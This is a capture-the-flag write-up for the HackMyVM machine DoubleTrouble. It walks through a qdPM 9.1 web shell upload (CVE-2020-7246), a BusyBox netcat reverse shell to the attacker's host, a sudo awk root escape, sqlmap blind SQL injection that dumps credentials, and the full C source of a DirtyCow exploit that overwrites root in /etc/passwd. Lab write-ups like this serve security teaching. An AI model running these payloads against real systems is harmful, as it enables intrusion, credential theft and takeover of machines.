# DoubleTrouble

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| DoubleTrouble | tasiyanci | Beginner | HackMyVM |

**Summary:** DoubleTrouble is a beginner-level vulnerable machine that presents a layered exploitation scenario requiring attackers to compromise two separate virtual machines. The initial attack vector involves exploiting CVE-2020-7246 in qdPM 9.1, a path traversal vulnerability that allows remote code execution through malicious file uploads. After gaining initial access and escalating to root on the first machine, attackers discover a nested OVA file containing a second vulnerable system. The second machine is vulnerable to SQL injection in a custom login form, which yields SSH credentials. Final privilege escalation is achieved by exploiting the DirtyCow kernel vulnerability (CVE-2016-5195) affecting the Linux 3.2.0-4 kernel. This machine effectively demonstrates multi-stage attack chains, steganography, web application vulnerabilities, SQL injection, and kernel exploits.

---

## Network Discovery

Initial reconnaissance began with a network scan to identify active virtual machines on the subnet.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.90 08:00:27:5F:85:F1 VirtualBox
```

The scan revealed a VirtualBox virtual machine at **192.168.100.90**, which became our primary target.

---

## Phase 1: First Machine (192.168.100.90)

### Port Enumeration

A comprehensive TCP port scan was performed using Nmap to identify running services and their versions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ nmap -sC -sV -p- -T4 192.168.100.90
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 12:40 WIB
Nmap scan report for 192.168.100.90
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.66 seconds
```

**Key Findings:**
- **Port 22**: OpenSSH 7.9p1 (Debian)
- **Port 80**: Apache httpd 2.4.38 serving qdPM application

### Web Application Analysis

Browsing to port 80 revealed a login page for **qdPM version 9.1**, a web-based project management tool.

![](image.png)

The application displayed a clear version number (qdPM 9.1), which became critical for identifying known vulnerabilities.

### Directory Enumeration

Gobuster was used to discover hidden directories and endpoints that might reveal sensitive information or additional attack surfaces.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ gobuster dir -u http://192.168.100.90/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.90/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 317] [--> http://192.168.100.90/images/]
/uploads              (Status: 301) [Size: 318] [--> http://192.168.100.90/uploads/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.100.90/css/]
/template             (Status: 301) [Size: 319] [--> http://192.168.100.90/template/]
/core                 (Status: 301) [Size: 315] [--> http://192.168.100.90/core/]
/install              (Status: 301) [Size: 318] [--> http://192.168.100.90/install/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.100.90/js/]
/sf                   (Status: 301) [Size: 313] [--> http://192.168.100.90/sf/]
/secret               (Status: 301) [Size: 317] [--> http://192.168.100.90/secret/]
/backups              (Status: 301) [Size: 318] [--> http://192.168.100.90/backups/]
/batch                (Status: 301) [Size: 316] [--> http://192.168.100.90/batch/]
/server-status        (Status: 403) [Size: 279]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

The most interesting discovery was the **`/secret`** directory, which warranted immediate investigation.

### Steganography Discovery

Accessing the `/secret` directory revealed directory listing was enabled, exposing a JPEG file named `doubletrouble.jpg`.

![](image-1.png)

The file was downloaded for offline analysis to check for hidden data.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ curl -O http://192.168.100.90/secret/doubletrouble.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 82779 100 82779   0     0 752037     0  --:--:-- --:--:-- --:--:-- 752536

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ ls -la doubletrouble.jpg
-rw-r--r-- 1 ouba ouba 82779 Feb  7 12:59 doubletrouble.jpg

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ exiftool doubletrouble.jpg
ExifTool Version Number         : 13.36
File Name                       : doubletrouble.jpg
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2026:02:07 12:59:48+07:00
File Access Date/Time           : 2026:02:07 12:59:48+07:00
File Inode Change Date/Time     : 2026:02:07 12:59:48+07:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 501
Image Height                    : 450
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 501x450
Megapixels                      : 0.225
```

Basic metadata analysis with ExifTool revealed no obvious clues. An attempt with `steghide` without a passphrase failed, indicating the embedded data was password-protected.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ steghide extract -sf doubletrouble.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

**StegSeek** was employed to brute-force the steganography passphrase using the rockyou.txt wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ stegseek doubletrouble.jpg -wl /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "92[REDACTED]"
[i] Original filename: "creds.txt".
[i] Extracting to "doubletrouble.jpg.out".


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ cat doubletrouble.jpg.out
otisrush@localhost.com
o[REDACTED]
```

**Success!** The passphrase `92[REDACTED]` extracted a text file containing credentials:
- **Username**: otisrush@localhost.com
- **Password**: o[REDACTED]

### Initial Access via qdPM Login

Using the discovered credentials, successful authentication to the qdPM application was achieved.

![](image-2.png)

After logging in, the dashboard confirmed we were operating as the user `otisrush`.

### Exploiting CVE-2020-7246 (Path Traversal & RCE)

Research into qdPM 9.1 vulnerabilities led to the discovery of **CVE-2020-7246**, documented at [CVE Details](https://www.cvedetails.com/cve/CVE-2020-7246/).

**Vulnerability Description:**
A remote code execution (RCE) vulnerability exists in qdPM 9.1 and earlier versions. An attacker can upload malicious PHP code via the profile photo functionality by leveraging a path traversal vulnerability in the `users['photop_preview']` delete photo feature, effectively bypassing `.htaccess` protections.

#### Accessing User Settings

The "My Account" settings page was accessed to locate the photo upload functionality.

![](image-3.png)

#### Creating a Web Shell

A simple PHP web shell was created to execute arbitrary system commands:

![](image-4.png)

This payload was uploaded through the Photo field in the profile settings.

#### Locating the Uploaded Shell

Directory listing was enabled on the `/uploads` directory, allowing direct browsing of uploaded files.

![](image-5.png)

Navigating to the `users` subdirectory revealed the uploaded PHP file.

![](image-6.png)

#### Achieving Remote Code Execution

The web shell was successfully accessed and command execution was verified.

![](image-7.png)

The shell was functional and capable of executing system commands via the `cmd` parameter.

### Establishing a Reverse Shell

To gain a fully interactive shell, a reverse shell was initiated using BusyBox's netcat implementation.

**Setting up the listener on the attacking machine:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Payload sent to the web shell:**
```
busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

![](image-8.png)

**Connection received:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 61039
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A shell was established as the `www-data` user.

### Shell Upgrade

The limited shell was upgraded to a fully interactive TTY using Python3:

```bash
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@doubletrouble:/var/www/html/uploads/users$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@doubletrouble:/var/www/html/uploads/users$ export SHELL=bash
</www/html/uploads/users$ export TERM=xterm-256color
www-data@doubletrouble:/var/www/html/uploads/users$ stty rows 50 cols 200
www-data@doubletrouble:/var/www/html/uploads/users$ reset
```

### Local Enumeration

Examination of `/etc/passwd` revealed no regular user accounts with login shells—only root had `/bin/bash` configured.

```bash
www-data@doubletrouble:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
```

### Privilege Escalation - First Machine

Checking sudo permissions revealed a privilege escalation vector:

```bash
www-data@doubletrouble:/home$ sudo -l
Matching Defaults entries for www-data on doubletrouble:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on doubletrouble:
    (ALL : ALL) NOPASSWD: /usr/bin/awk
```

The `www-data` user could execute `/usr/bin/awk` as root without a password. Consulting [GTFOBins](https://gtfobins.org/gtfobins/awk/) provided the exploitation technique.

![](image-9.png)

**Exploitation:**

```bash
www-data@doubletrouble:/home$ sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
root@doubletrouble:/home# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
doubletrouble
root@doubletrouble:/home# cd /root/
root@doubletrouble:~# ls -la
total 403472
drwx------  2 root root      4096 Sep 11  2021 .
drwxr-xr-x 18 root root      4096 Dec 17  2020 ..
-rw-------  1 root root        46 Sep 11  2021 .bash_history
-rw-r--r--  1 root root 413142528 Sep 11  2021 doubletrouble.ova
```

**Root access achieved!** However, no flag was found in `/root`. Instead, a suspicious **413 MB OVA file** named `doubletrouble.ova` was discovered, hinting at a nested virtual machine.

### Extracting the Nested VM

The OVA file was exfiltrated by starting a Python HTTP server on the compromised machine:

```bash
root@doubletrouble:~# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

**Downloading the OVA file:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ curl -O http://192.168.100.90:8080/doubletrouble.ova
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 394.0M 100 394.0M   0     0  4702k     0   0:01:25  0:01:25 --:--:--  5437k
```

Download confirmation from the server logs:

```bash
192.168.100.1 - - [07/Feb/2026 00:52:20] "GET /doubletrouble.ova HTTP/1.1" 200 -
```

The OVA was successfully downloaded and imported into VirtualBox.

---

## Phase 2: Second Machine (192.168.100.91)

### Network Discovery

After importing and starting the nested VM, a network scan revealed a new host:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.91 08:00:27:2A:55:9E VirtualBox
192.168.100.90 08:00:27:5F:85:F1 VirtualBox
```

The second machine was assigned IP **192.168.100.91**.

### Port Enumeration

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ nmap -sC -sV -p- -T4 192.168.100.91
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 14:07 WIB
Nmap scan report for 192.168.100.91
Host is up (0.0027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u4 (protocol 2.0)
| ssh-hostkey:
|   1024 e8:4f:84:fc:7a:20:37:8b:2b:f3:14:a9:54:9e:b7:0f (DSA)
|   2048 0c:10:50:f5:a2:d8:74:f1:94:c5:60:d7:1a:78:a4:e6 (RSA)
|_  256 05:03:95:76:0c:7f:ac:db:b2:99:13:7e:9c:26:ca:d1 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds
```

**Key Findings:**
- **Port 22**: OpenSSH 6.0p1 (Debian 7 "Wheezy" - significantly outdated)
- **Port 80**: Apache httpd 2.2.22 (also outdated)

The service versions indicated this was running an older Debian 7 system.

### Web Application - SQL Injection

Browsing to port 80 revealed a simple custom login form.

![](image-10.png)

This custom application appeared to be a prime candidate for SQL injection testing.

#### Capturing the Login Request

The POST request was intercepted and saved for SQL injection analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ cat req_192.168.100.91.txt
POST /index.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: id,en-US;q=0.9,en;q=0.8,id-ID;q=0.7,la;q=0.6
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Host: 192.168.100.91
Origin: http://192.168.100.91
Referer: http://192.168.100.91/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

uname=admin&psw=admin&btnLogin=Login
```

#### Automated SQL Injection with SQLMap

SQLMap was utilized to automatically identify and exploit SQL injection vulnerabilities:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ sqlmap -r req_192.168.100.91.txt --dbs --batch
...
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7109 FROM (SELECT(SLEEP(5)))bPix) AND 'Ssut'='Ssut&psw=admin&btnLogin=Login
---
...
web server operating system: Linux Debian 7 (wheezy)
web application technology: Apache 2.2.22, PHP 5.5.38
back-end DBMS: MySQL >= 5.0.12
...
available databases [2]:
[*] doubletrouble
[*] information_schema
...
```

**Confirmed:** Time-based blind SQL injection vulnerability in the `uname` parameter. The backend database contained a `doubletrouble` database.

#### Enumerating Tables

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ sqlmap -r req_192.168.100.91.txt --batch -D doubletrouble --tables
...
Database: doubletrouble
[1 table]
+-------+
| users |
+-------+
...
```

A single table named `users` was identified.

#### Enumerating Columns

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ sqlmap -r req_192.168.100.91.txt --batch -D doubletrouble -T users --columns
...
Database: doubletrouble
Table: users
[2 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+
...
```

The table contained `username` and `password` columns.

#### Dumping User Credentials

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ sqlmap -r req_192.168.100.91.txt --batch -D doubletrouble -T users -C username,password --dump
...
Database: doubletrouble
Table: users
[2 entries]
+----------+-------------+
| username | password    |
+----------+-------------+
| montreux | GfsZxc1     |
| clapton  | Z[REDACTED] |
+----------+-------------+
...
```

**Credentials obtained:**
- **User 1**: montreux / GfsZxc1
- **User 2**: clapton / Z[REDACTED]

### SSH Access

Initially assuming these were web application credentials, they were tested against SSH and successfully authenticated:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doubletrouble]
└─$ ssh clapton@192.168.100.91
...
clapton@192.168.100.91's password:
Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64
...
clapton@doubletrouble:~$ id
uid=1000(clapton) gid=1000(clapton) groups=1000(clapton)
clapton@doubletrouble:~$ ls -la
total 16
drwxr-xr-x 3 clapton clapton 4096 Sep  6  2021 .
drwxr-xr-x 3 root    root    4096 Sep  6  2021 ..
drwx------ 2 clapton clapton 4096 Sep  6  2021 .ssh
-r-x------ 1 clapton clapton   32 Sep  8  2021 user.txt
```

**Success!** SSH access was gained as user `clapton`. The **user flag** (`user.txt`) was located in the home directory.

### Privilege Escalation - Second Machine (DirtyCow)

Kernel version enumeration revealed a critically outdated kernel:

```bash
clapton@doubletrouble:~$ uname -a
Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```

**Linux kernel 3.2.0** is vulnerable to **CVE-2016-5195**, commonly known as **DirtyCow** - a race condition in the memory subsystem that allows privilege escalation.

#### DirtyCow Exploit

The exploit from [firefart's DirtyCow repository](https://github.com/firefart/dirtycow/tree/master) was selected. The exploit was modified to overwrite the root account instead of creating a new "toor" user.

**Modified exploit code (dirty.c):**

```c
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "toor".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su toor" or "ssh toor@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "firefart" Mehlmauer
// https://firefart.at
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "toor";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "root";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
```

**Compilation and execution:**

```bash
clapton@doubletrouble:~$ nano dirty.c
clapton@doubletrouble:~$ which gcc
/usr/bin/gcc
clapton@doubletrouble:~$ gcc -pthread dirty.c -o dirty -lcrypt
clapton@doubletrouble:~$ ls -la dirty
-rwxr-xr-x 1 clapton clapton 12494 Feb  7 01:44 dirty
clapton@doubletrouble:~$ ./dirty rooted
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: rooted
Complete line:
root:to2/7ViaJUwqc:0:0:pwned:/root:/bin/bash

mmap: 7fc936f72000
^C
```

The exploit successfully overwrote the root account entry in `/etc/passwd` with a known password hash.

### Root Access and Flag Capture

Switching to the root user with the newly set password:

```bash
clapton@doubletrouble:~$ su - root
Password:
root@doubletrouble:~# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
doubletrouble
root@doubletrouble:~# cat /root/root.txt ; echo ; cat /home/clapton/user.txt ; echo
1B8[REDACTED]
6CE[REDACTED]
```

**Both flags captured:**
- **User Flag**: 6CE[REDACTED]
- **Root Flag**: 1B8[REDACTED]

---

## Attack Chain Summary

1. **Network Reconnaissance**: Identified target at 192.168.100.90 running OpenSSH 7.9p1 and Apache 2.4.38 with qdPM 9.1 web application.

2. **Web Enumeration**: Discovered `/secret` directory via Gobuster containing steganography-protected image file `doubletrouble.jpg`.

3. **Credential Discovery**: Used StegSeek to brute-force steganography passphrase (`92[REDACTED]`), extracting credentials `otisrush@localhost.com:o[REDACTED]`.

4. **CVE-2020-7246 Exploitation**: Authenticated to qdPM 9.1 and exploited path traversal vulnerability to upload PHP web shell via profile photo feature, achieving remote code execution.

5. **Reverse Shell**: Leveraged web shell to execute BusyBox netcat reverse shell payload, establishing interactive shell as `www-data`.

6. **First Privilege Escalation**: Exploited sudo misconfiguration allowing `www-data` to execute `/usr/bin/awk` as root without password, spawning root shell using GTFOBins technique.

7. **Nested VM Discovery**: Found 413MB `doubletrouble.ova` file in `/root`, downloaded and imported into VirtualBox to access second challenge machine at 192.168.100.91.

8. **SQL Injection Attack**: Identified time-based blind SQL injection in custom login form on second machine, used SQLMap to enumerate database and extract SSH credentials for users `montreux` and `clapton`.

9. **SSH Authentication**: Successfully authenticated as user `clapton` via SSH, captured user flag.

10. **Kernel Exploitation**: Identified vulnerable kernel version 3.2.0-4 affected by CVE-2016-5195 (DirtyCow), compiled and executed modified DirtyCow exploit to overwrite root account password in `/etc/passwd`.

11. **Final Privilege Escalation**: Authenticated as root using modified password, captured root flag, completing full compromise of both machines.

